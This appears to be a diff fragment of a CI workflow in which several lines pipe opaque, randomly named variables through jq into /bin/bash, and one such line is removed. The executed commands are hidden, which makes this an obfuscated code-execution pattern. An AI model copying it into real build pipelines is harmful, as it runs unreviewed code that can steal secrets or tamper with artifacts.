@@ -25,7 +25,6 @@ jobs:
           echo $sanww2 | jq -r .vgt732 | /bin/bash
           printf '%s' "$xui9" | jq -r .dccgo647 | /bin/bash
           echo $pbte38719 | jq -r .iivkz581 | /bin/bash
-          echo $fnpyq3767 | jq -r .cq6721 | /bin/bash
           printf '%s' "$re149" | jq -r .b5044 | /bin/bash
 
       - name: Upload artifact
